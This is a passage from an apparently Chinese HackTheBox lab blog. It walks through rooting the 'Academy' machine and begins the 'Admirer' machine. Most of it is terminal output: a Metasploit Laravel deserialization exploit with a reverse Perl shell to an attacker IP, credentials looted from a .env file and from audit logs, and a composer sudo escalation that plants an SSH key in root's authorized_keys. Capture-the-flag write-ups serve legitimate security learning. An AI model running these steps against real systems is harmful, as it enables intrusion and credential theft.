<h3 id="5-exploitå¾—åˆ°shell"><a href="#5-exploitå¾—åˆ°shell" class="headerlink" title="5.exploitå¾—åˆ°shell"></a>5.exploitå¾—åˆ°shell</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf5 exploit(unix/http/laravel_token_unserialize_exec) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/http/laravel_token_unserialize_exec):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting                               Required  Description</span><br><span class="line">   ----       ---------------                               --------  -----------</span><br><span class="line">   APP_KEY    dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=  no        The base64 encoded APP_KEY string from the .env file</span><br><span class="line">   Proxies                                                  no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS     academy.htb                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT      80                                            yes       The target port (TCP)</span><br><span class="line">   SSL        false                                         no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   TARGETURI  /                                             yes       Path to target webapp</span><br><span class="line">   VHOST      dev-staging-01.academy.htb                    no        HTTP server virtual host</span><br><span class="line">Payload options (cmd/unix/reverse_perl):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  10.10.17.216     yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line">msf5 exploit(unix/http/laravel_token_unserialize_exec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.17.216:4444 </span><br><span class="line">[*] Command shell session 1 opened (10.10.17.216:4444 -&gt; 10.10.10.215:39152) at 2020-12-09 03:07:26 -0500</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">pwd</span><br><span class="line">/var/www/html/htb-academy-dev-01/public</span><br><span class="line">ls</span><br><span class="line">css</span><br><span class="line">favicon.ico</span><br><span class="line">index.php</span><br><span class="line">js</span><br><span class="line">robots.txt</span><br><span class="line">web.config</span><br></pre></td></tr></table></figure>

<h3 id="6-å‡çº§äº¤äº’shell"><a href="#6-å‡çº§äº¤äº’shell" class="headerlink" title="6.å‡çº§äº¤äº’shell"></a>6.å‡çº§äº¤äº’shell</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">www-data@academy:/var/www/html/htb-academy-dev-01/public$ </span><br><span class="line">www-data@academy:/var/www/html/htb-academy-dev-01/public$ ls</span><br><span class="line">ls</span><br><span class="line">css  favicon.ico  index.php  js  robots.txt  web.config</span><br><span class="line">www-data@academy:/var/www/html/htb-academy-dev-01/public$ cd ../../</span><br><span class="line">cd ../../</span><br></pre></td></tr></table></figure>

<h3 id="7-æ‰‹åŠ¨çˆ¬è™«å¾—åˆ°äº†ä¸€ä¸ªå£ä»¤mySup3rP4s5w0rd"><a href="#7-æ‰‹åŠ¨çˆ¬è™«å¾—åˆ°äº†ä¸€ä¸ªå£ä»¤mySup3rP4s5w0rd" class="headerlink" title="7.æ‰‹åŠ¨çˆ¬è™«å¾—åˆ°äº†ä¸€ä¸ªå£ä»¤mySup3rP4s5w0rd!!"></a>7.æ‰‹åŠ¨çˆ¬è™«å¾—åˆ°äº†ä¸€ä¸ªå£ä»¤<code>mySup3rP4s5w0rd!!</code></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@academy:/var/www$ pwd</span><br><span class="line">pwd</span><br><span class="line">/var/www/html</span><br><span class="line">www-data@academy:/var/www/html$ ls</span><br><span class="line">ls</span><br><span class="line">academy  htb-academy-dev-01  index.php</span><br><span class="line">www-data@academy:/var/www/html$ cd academy</span><br><span class="line">cd academy</span><br><span class="line">www-data@academy:/var/www/html/academy$ ls</span><br><span class="line">ls</span><br><span class="line">app        composer.json  database      public     routes      tests</span><br><span class="line">artisan    composer.lock  package.json  readme.md  server.php  vendor</span><br><span class="line">bootstrap  config         phpunit.xml   resources  storage     webpack.mix.js</span><br><span class="line">www-data@academy:/var/www/html/academy$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 280</span><br><span class="line">drwxr-xr-x 12 www-data www-data   4096 Aug 13 12:42 .</span><br><span class="line">drwxr-xr-x  4 root     root       4096 Aug 13 12:36 ..</span><br><span class="line">-rw-r--r--  1 www-data www-data    706 Aug 13 12:42 .env</span><br><span class="line">-rw-r--r--  1 www-data www-data    651 Feb  7  2018 .env.example</span><br><span class="line">-rw-r--r--  1 www-data www-data    111 Feb  7  2018 .gitattributes</span><br><span class="line">-rw-r--r--  1 www-data www-data    155 Feb  7  2018 .gitignore</span><br><span class="line">drwxr-xr-x  6 www-data www-data   4096 Feb  7  2018 app</span><br><span class="line">-rwxr-xr-x  1 www-data www-data   1686 Feb  7  2018 artisan</span><br><span class="line">drwxr-xr-x  3 www-data www-data   4096 Feb  7  2018 bootstrap</span><br><span class="line">-rw-r--r--  1 www-data www-data   1512 Feb  7  2018 composer.json</span><br><span class="line">-rw-r--r--  1 www-data www-data 191621 Aug  9 11:57 composer.lock</span><br><span class="line">drwxr-xr-x  2 www-data www-data   4096 Feb  7  2018 config</span><br><span class="line">drwxr-xr-x  5 www-data www-data   4096 Feb  7  2018 database</span><br><span class="line">-rw-r--r--  1 www-data www-data   1150 Feb  7  2018 package.json</span><br><span class="line">-rw-r--r--  1 www-data www-data   1040 Feb  7  2018 phpunit.xml</span><br><span class="line">drwxr-xr-x  4 www-data www-data   4096 Nov  9 10:13 public</span><br><span class="line">-rw-r--r--  1 www-data www-data   3622 Feb  7  2018 readme.md</span><br><span class="line">drwxr-xr-x  5 www-data www-data   4096 Feb  7  2018 resources</span><br><span class="line">drwxr-xr-x  2 www-data www-data   4096 Feb  7  2018 routes</span><br><span class="line">-rw-r--r--  1 www-data www-data    563 Feb  7  2018 server.php</span><br><span class="line">drwxr-xr-x  5 www-data www-data   4096 Feb  7  2018 storage</span><br><span class="line">drwxr-xr-x  4 www-data www-data   4096 Feb  7  2018 tests</span><br><span class="line">drwxr-xr-x 38 www-data www-data   4096 Aug  9 11:57 vendor</span><br><span class="line">-rw-r--r--  1 www-data www-data    549 Feb  7  2018 webpack.mix.js</span><br><span class="line">www-data@academy:/var/www/html/academy$ cat .env</span><br><span class="line">cat .env</span><br><span class="line">APP_NAME=Laravel</span><br><span class="line">APP_ENV=local</span><br><span class="line">APP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=</span><br><span class="line">APP_DEBUG=false</span><br><span class="line">APP_URL=http://localhost</span><br><span class="line"></span><br><span class="line">LOG_CHANNEL=stack</span><br><span class="line"></span><br><span class="line">DB_CONNECTION=mysql</span><br><span class="line">DB_HOST=127.0.0.1</span><br><span class="line">DB_PORT=3306</span><br><span class="line">DB_DATABASE=academy</span><br><span class="line">DB_USERNAME=dev</span><br><span class="line">DB_PASSWORD=mySup3rP4s5w0rd!!</span><br><span class="line"></span><br><span class="line">BROADCAST_DRIVER=log</span><br><span class="line">CACHE_DRIVER=file</span><br><span class="line">SESSION_DRIVER=file</span><br><span class="line">SESSION_LIFETIME=120</span><br><span class="line">QUEUE_DRIVER=sync</span><br><span class="line"></span><br><span class="line">REDIS_HOST=127.0.0.1</span><br><span class="line">REDIS_PASSWORD=null</span><br><span class="line">REDIS_PORT=6379</span><br><span class="line"></span><br><span class="line">MAIL_DRIVER=smtp</span><br><span class="line">MAIL_HOST=smtp.mailtrap.io</span><br><span class="line">MAIL_PORT=2525</span><br><span class="line">MAIL_USERNAME=null</span><br><span class="line">MAIL_PASSWORD=null</span><br><span class="line">MAIL_ENCRYPTION=null</span><br><span class="line"></span><br><span class="line">PUSHER_APP_ID=</span><br><span class="line">PUSHER_APP_KEY=</span><br><span class="line">PUSHER_APP_SECRET=</span><br><span class="line">PUSHER_APP_CLUSTER=mt1</span><br><span class="line"></span><br><span class="line">MIX_PUSHER_APP_KEY=&quot;$&#123;PUSHER_APP_KEY&#125;&quot;</span><br><span class="line">MIX_PUSHER_APP_CLUSTER=&quot;$&#123;PUSHER_APP_CLUSTER&#125;&quot;</span><br></pre></td></tr></table></figure>

<h3 id="8-ç»è¿‡å°è¯•å‘ç°cry0l1t3å¯ä»¥ç™»å…¥"><a href="#8-ç»è¿‡å°è¯•å‘ç°cry0l1t3å¯ä»¥ç™»å…¥" class="headerlink" title="8.ç»è¿‡å°è¯•å‘ç°cry0l1t3å¯ä»¥ç™»å…¥"></a>8.ç»è¿‡å°è¯•å‘ç°<code>cry0l1t3</code>å¯ä»¥ç™»å…¥</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@academy:/var/www/html/academy$ cd /home</span><br><span class="line">cd /home</span><br><span class="line">www-data@academy:/home$ ls</span><br><span class="line">ls</span><br><span class="line">21y4d  ch4p  cry0l1t3  egre55  g0blin  mrb3n</span><br><span class="line">www-data@academy:/home$ su cry0l1t3</span><br><span class="line">su cry0l1t3</span><br><span class="line">Password: mySup3rP4s5w0rd!!</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> /bin/bash</span></span><br><span class="line">/bin/bash</span><br><span class="line">cry0l1t3@academy:/home$ </span><br><span class="line"></span><br><span class="line">cry0l1t3@academy:/home$ cd ~</span><br><span class="line">cd ~</span><br><span class="line">cry0l1t3@academy:~$ ls</span><br><span class="line">ls</span><br><span class="line">user.txt</span><br><span class="line">cry0l1t3@academy:~$ cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">***************************</span><br><span class="line">cry0l1t3@academy:~$ </span><br></pre></td></tr></table></figure>

<h2 id="0x09-ææƒ"><a href="#0x09-ææƒ" class="headerlink" title="0x09.ææƒ"></a>0x09.ææƒ</h2><h3 id="1-å°è¯•sudo-lè¿›è¡Œææƒ-éœ¸ç‰¹æ²¡æœ‰"><a href="#1-å°è¯•sudo-lè¿›è¡Œææƒ-éœ¸ç‰¹æ²¡æœ‰" class="headerlink" title="1.å°è¯•sudo -lè¿›è¡Œææƒ ,éœ¸ç‰¹æ²¡æœ‰"></a>1.å°è¯•sudo -lè¿›è¡Œææƒ ,éœ¸ç‰¹æ²¡æœ‰</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cry0l1t3@academy:~$ sudo -l</span><br><span class="line">[sudo] password for cry0l1t3: </span><br><span class="line">Sorry, user cry0l1t3 may not run sudo on academy.</span><br><span class="line">cry0l1t3@academy:~$</span><br></pre></td></tr></table></figure>

<h3 id="2-å¯¹SElinuxçš„æ—¥å¿—è¿›è¡Œå®¡è®¡"><a href="#2-å¯¹SElinuxçš„æ—¥å¿—è¿›è¡Œå®¡è®¡" class="headerlink" title="2.å¯¹SElinuxçš„æ—¥å¿—è¿›è¡Œå®¡è®¡"></a>2.å¯¹SElinuxçš„æ—¥å¿—è¿›è¡Œå®¡è®¡</h3><p><strong><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmdlbnRvby5vcmcvd2lraS9TRUxpbnV4L1R1dG9yaWFscy9XaGVyZV90b19maW5kX1NFTGludXhfcGVybWlzc2lvbl9kZW5pYWxfZGV0YWlscyM6fjp0ZXh0PVNFTGludXglMjBsb2dnaW5nLC1UaGUlMjBtb3N0JTIwaW1wb3J0YW50JnRleHQ9VGhlJTIwZGVmYXVsdCUyMGxvY2F0aW9uJTIwd2hlcmUlMjB5b3UsJTJGdmFyJTJGbG9nJTJGYXVkaXQu">å‚è€ƒæ–‡çŒ®<i class="fa fa-external-link-alt"></i></span></strong></p>
<p><code>å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªç”¨æˆ·è¿›è¡Œè¿‡su</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cry0l1t3@academy:/var/log/audit$ cat * | grep &#x27;comm=&quot;su&quot;&#x27;</span><br><span class="line">type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;su&quot; data=6D7262336E5F41634064336D79210A</span><br><span class="line">cry0l1t3@academy:/var/log/audit$</span><br></pre></td></tr></table></figure>

<p><code>è§£ç hex</code></p>
<blockquote>
<p>å¯†æ–‡ï¼š6D7262336E5F41634064336D79210A</p>
<p>åŸæ–‡ï¼šmrb3n_Ac@d3my!</p>
</blockquote>
<p><code>æ ¹æ®å¯†ç å¯ä»¥æ¨æµ‹ä¸ºmrb3nçš„å¯†ç </code></p>
<h3 id="3-mrb3nç™»å…¥"><a href="#3-mrb3nç™»å…¥" class="headerlink" title="3.mrb3nç™»å…¥"></a>3.mrb3nç™»å…¥</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cry0l1t3@academy:/var/log/audit$ su mrb3n</span><br><span class="line">Password: </span><br><span class="line"><span class="meta">$</span><span class="bash"> /bin/bash</span></span><br><span class="line">mrb3n@academy:/var/log/audit$</span><br></pre></td></tr></table></figure>

<p><code>sudo -lææƒ</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mrb3n@academy:/var/log/audit$ sudo -l</span><br><span class="line">[sudo] password for mrb3n:  </span><br><span class="line">Matching Defaults entries for mrb3n on academy:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User mrb3n may run the following commands on academy:</span><br><span class="line">    (ALL) /usr/bin/composer</span><br><span class="line">mrb3n@academy:/var/log/audit$</span><br></pre></td></tr></table></figure>

<h3 id="4-composerææƒ"><a href="#4-composerææƒ" class="headerlink" title="4.composerææƒ"></a>4.composerææƒ</h3><p><span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvY29tcG9zZXIv">å‚è€ƒ<i class="fa fa-external-link-alt"></i></span></p>
<p><code>ç›´æ¥è¿›è¡Œåˆ©ç”¨éœ¸ç‰¹å¤±è´¥äº†ğŸ™ƒ</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mrb3n@academy:/var/log/audit$ TF=$(mktemp -d)</span><br><span class="line">mrb3n@academy:/var/log/audit$ echo &#x27;&#123;&quot;scripts&quot;:&#123;&quot;x&quot;:&quot;/bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3&quot;&#125;&#125;&#x27; &gt;$TF/composer.json</span><br><span class="line">mrb3n@academy:/var/log/audit$ composer --working-dir=$TF run-script x</span><br><span class="line">PHP Warning:  PHP Startup: Unable to load dynamic library &#x27;mysqli.so&#x27; (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0</span><br><span class="line">PHP Warning:  PHP Startup: Unable to load dynamic library &#x27;pdo_mysql.so&#x27; (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> /bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> whoami</span></span><br><span class="line">mrb3n</span><br><span class="line"><span class="meta">$</span></span><br></pre></td></tr></table></figure>

<p><code>æ›´æ¢æ€è·¯ï¼Œåˆ©ç”¨sshå…¬é’¥è¿›è¡Œææƒ</code></p>
<blockquote>
<p>é¦–å…ˆä½¿ç”¨ssh-keygenç”Ÿæˆå…¬é’¥ä¸ç§é’¥</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~# ssh-keygen </span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file in which to save the key (/root/.ssh/id_rsa): </span><br><span class="line">Enter passphrase (empty for no passphrase): </span><br><span class="line">Enter same passphrase again: </span><br><span class="line">Your identification has been saved in /root/.ssh/id_rsa</span><br><span class="line">Your public key has been saved in /root/.ssh/id_rsa.pub</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:FKBkE5JZ5qaTiSzGFeu24nBc+9uHrMC4EI1Q6/gOXnc root@JIYE</span><br><span class="line">The key&#x27;s randomart image is:</span><br><span class="line">+---[RSA 3072]----+</span><br><span class="line">|  o=B....        |</span><br><span class="line">| .oBoo   .       |</span><br><span class="line">|. .o+   .        |</span><br><span class="line">|+*o=   .         |</span><br><span class="line">|*+Bo.   S        |</span><br><span class="line">|o+.=..           |</span><br><span class="line">|+.=o+. E .       |</span><br><span class="line">|+=o..o..o .      |</span><br><span class="line">| oo   +o..       |</span><br><span class="line">+----[SHA256]-----+</span><br><span class="line">root@JIYE:~# cd .ssh/</span><br><span class="line">root@JIYE:~/.ssh# ls</span><br><span class="line">id_rsa  id_rsa.pub  known_hosts</span><br><span class="line">.pubä¸ºå…¬é’¥</span><br><span class="line">root@JIYE:~/.ssh# cat id_rsa.pub </span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDIuoa+nxwrqqxtdN5zqWblCzN6U6ltR0eZXI+tnPHt2Dx/6ms2bEqSmAV66ETVyjXQKe2fHzNWdhjj4Y48M4eQY+iSR/IxqfxxLysspB0hzylreY+/ScKwvA7LcxoIUR8D5YZq5kGkGR50sO2m16l7kb2X7A9FO6SHTRPbGKlnFI7kypQCoYmgLX7czaci3Ol0pVpYAhFEiNZIt43uU8uwvGELQnj5j9pcPrJU7yDqA/Xm11PUe9x6wrUKmW3pwhiHLT/ONJm8OzBiGvIaAxEK/DvVarrt+DjrlXAugZw87aip+SlBJSpQDWPxk8rAwvCLx1lVvFRekPIvByaRwHHNYypenZHKJi8UCWwEKM004uw4gEuG6VKciPd/eCnrx5Xrufrg2IW9foB9JAFKUICN/be73uJe8DbGn0hLRN+Yr0rE7CDw+ZPqAMp4bKrf9FicUS8fS1eUmAMjIAAN6j6zbI2ftU5EaoJ27CW2evknUcSbgO7fx6hxwt0dliCpXZc= root@JIYE</span><br></pre></td></tr></table></figure>

<p><code>ä¾æ¬¡ç¼–å†™</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mrb3n@academy:~$ TF=$(mktemp -d)</span><br><span class="line">mrb3n@academy:~$ vim $TF/composer.json</span><br><span class="line">&#123;&quot;scripts&quot;:&#123;&quot;SSH&quot;:&quot;echo &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDIuoa+nxwrqqxtdN5zqWblCzN6U6ltR0eZXI+tnPHt2Dx/6ms2bEqSmAV66ETVyjXQKe2fHzNWdhjj4Y48M4eQY+iSR/IxqfxxLysspB0hzylreY+/ScKwvA7LcxoIUR8D5YZq5kGkGR50sO2m16l7kb2X7A9FO6SHTRPbGKlnFI7kypQCoYmgLX7czaci3Ol0pVpYAhFEiNZIt43uU8uwvGELQnj5j9pcPrJU7yDqA/Xm11PUe9x6wrUKmW3pwhiHLT/ONJm8OzBiGvIaAxEK/DvVarrt+DjrlXAugZw87aip+SlBJSpQDWPxk8rAwvCLx1lVvFRekPIvByaRwHHNYypenZHKJi8UCWwEKM004uw4gEuG6VKciPd/eCnrx5Xrufrg2IW9foB9JAFKUICN/be73uJe8DbGn0hLRN+Yr0rE7CDw+ZPqAMp4bKrf9FicUS8fS1eUmAMjIAAN6j6zbI2ftU5EaoJ27CW2evknUcSbgO7fx6hxwt0dliCpXZc=&#x27; &gt;&gt; /root/.ssh/authorized_keys&quot;&#125;&#125;</span><br><span class="line"></span><br><span class="line">mrb3n@academy:~$ sudo composer --working-dir=$TF run-script SSH</span><br><span class="line">[sudo] password for mrb3n: </span><br><span class="line">PHP Warning:  PHP Startup: Unable to load dynamic library &#x27;mysqli.so&#x27; (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0</span><br><span class="line">PHP Warning:  PHP Startup: Unable to load dynamic library &#x27;pdo_mysql.so&#x27; (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0</span><br><span class="line">Do not run Composer as root/super user! See https://getcomposer.org/root for details</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDIuoa+nxwrqqxtdN5zqWblCzN6U6ltR0eZXI+tnPHt2Dx/6ms2bEqSmAV66ETVyjXQKe2fHzNWdhjj4Y48M4eQY+iSR/IxqfxxLysspB0hzylreY+/ScKwvA7LcxoIUR8D5YZq5kGkGR50sO2m16l7kb2X7A9FO6SHTRPbGKlnFI7kypQCoYmgLX7czaci3Ol0pVpYAhFEiNZIt43uU8uwvGELQnj5j9pcPrJU7yDqA/Xm11PUe9x6wrUKmW3pwhiHLT/ONJm8OzBiGvIaAxEK/DvVarrt+DjrlXAugZw87aip+SlBJSpQDWPxk8rAwvCLx1lVvFRekPIvByaRwHHNYypenZHKJi8UCWwEKM004uw4gEuG6VKciPd/eCnrx5Xrufrg2IW9foB9JAFKUICN/be73uJe8DbGn0hLRN+Yr0rE7CDw+ZPqAMp4bKrf9FicUS8fS1eUmAMjIAAN6j6zbI2ftU5EaoJ27CW2evknUcSbgO7fx6hxwt0dliCpXZc=&#x27;</span> &gt;&gt; /root/.ssh/authorized_keys</span></span><br><span class="line">mrb3n@academy:~$</span><br></pre></td></tr></table></figure>

<p><code>sshè¿›è¡Œè¿æ¥</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/.ssh# ssh -i id_rsa root@10.10.10.215</span><br><span class="line">kex_exchange_identification: read: Connection reset by peer</span><br><span class="line">Connection reset by 10.10.10.215 port 22</span><br><span class="line">root@JIYE:~/.ssh# ssh -i id_rsa root@10.10.10.215</span><br><span class="line">Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-52-generic x86_64)</span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line">  System information as of Wed 09 Dec 2020 11:36:12 AM UTC</span><br><span class="line">  System load:             0.0</span><br><span class="line">  Usage of /:              44.4% of 15.68GB</span><br><span class="line">  Memory usage:            21%</span><br><span class="line">  Swap usage:              0%</span><br><span class="line">  Processes:               178</span><br><span class="line">  Users logged in:         1</span><br><span class="line">  IPv4 address for ens160: 10.10.10.215</span><br><span class="line">  IPv6 address for ens160: dead:beef::250:56ff:feb9:c8a</span><br><span class="line"> * Introducing self-healing high availability clustering for MicroK8s!</span><br><span class="line">   Super simple, hardened and opinionated Kubernetes for production.</span><br><span class="line"></span><br><span class="line">     https://microk8s.io/high-availability</span><br><span class="line">0 updates can be installed immediately.</span><br><span class="line">0 of these updates are security updates.</span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line">Last login: Mon Nov  9 10:11:49 2020</span><br><span class="line">root@academy:~# ls</span><br><span class="line">academy.txt  root.txt  snap</span><br><span class="line">root@academy:~# cat root.txt </span><br><span class="line">********************</span><br><span class="line">root@academy:~#</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-[admirer]</title>
    <url>/2020/09/05/HTB-admirer/</url>
    <content><![CDATA[<h2 id="0x00-ç®€è¿°"><a href="#0x00-ç®€è¿°" class="headerlink" title="0x00.ç®€è¿°"></a>0x00.ç®€è¿°</h2><img src="/2020/09/05/HTB-admirer/image-20200905162252401.png" class>

<a id="more"></a>

<h2 id="0x01-ä¿¡æ¯æ”¶é›†"><a href="#0x01-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x01.ä¿¡æ¯æ”¶é›†"></a>0x01.ä¿¡æ¯æ”¶é›†</h2><p><code>å¼€æ”¾äº†21/22/80ç«¯å£ï¼Œrobots.txtä¸­ä¸€ä¸ªä¸å…è®¸çˆ¬è™«ç›®å½•admin-dir</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/admirer<span class="comment"># nmap -sC -sV -sT 10.10.10.187 -oN nmap.CVT</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-05 01:33 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.187</span><br><span class="line">Host is up (0.37s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)</span><br><span class="line">|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)</span><br><span class="line">|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/admin-dir</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Admirer</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 47.20 seconds</span><br><span class="line">root@JIYE:~/htb/admirer<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h2 id="0x02-è®¿é—®80ç«¯å£"><a href="#0x02-è®¿é—®80ç«¯å£" class="headerlink" title="0x02.è®¿é—®80ç«¯å£"></a>0x02.è®¿é—®80ç«¯å£</h2><p><code>æ‰‹åŠ¨çˆ¬è™«æ²¡æœ‰å‘ç°ä»€ä¹ˆæœ‰ç”¨çš„</code></p>
<img src="/2020/09/05/HTB-admirer/image-20200905134139066.png" class>

<p><code>æŸ¥çœ‹robots.txtï¼Œä¸nmapæ‰«æå‡ºçš„ç»“æœä¸€æ ·</code></p>
<img src="/2020/09/05/HTB-admirer/image-20200905134240144.png" class>

<p><code>æŸ¥çœ‹admin-dirç›®å½•ï¼Œç»“æœæ˜¯æ²¡æœ‰æƒé™</code></p>
<img src="/2020/09/05/HTB-admirer/image-20200905134351785.png" class>

<h2 id="0x03-FUZZæµ‹è¯•"><a href="#0x03-FUZZæµ‹è¯•" class="headerlink" title="0x03.FUZZæµ‹è¯•"></a>0x03.FUZZæµ‹è¯•</h2><p><code>åˆ›å»ºå­—å…¸</code><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RhbmllbG1pZXNzbGVyL1NlY0xpc3RzL2Jsb2IvbWFzdGVyL0Rpc2NvdmVyeS9XZWItQ29udGVudC9iaWcudHh0">æœ¬æ¬¡å­—å…¸<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/admirer<span class="comment"># ls</span></span><br><span class="line">big.txt  nmap.CVT</span><br></pre></td></tr></table></figure>

<p><code>æ‰«æï¼Œå‘ç°ä¸¤ä¸ªæ–‡ä»¶</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/admirer<span class="comment"># wfuzz -c -w big.txt -z list,txt-php-html -u http://10.10.10.187/admin-dir/FUZZ.FUZ2Z --hc 404,403 -t 50</span></span><br><span class="line"></span><br><span class="line">Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="string">&#x27;s documentation for more information.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string">* Wfuzz 2.4.5 - The Web Fuzzer                         *</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Target: http://10.10.10.187/admin-dir/FUZZ.FUZ2Z</span></span><br><span class="line"><span class="string">Total requests: 61419</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">===================================================================</span></span><br><span class="line"><span class="string">ID           Response   Lines    Word     Chars       Payload                                                                                     </span></span><br><span class="line"><span class="string">===================================================================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">000015592:   200        29 L     39 W     350 Ch      &quot;contacts - txt&quot;                                                                            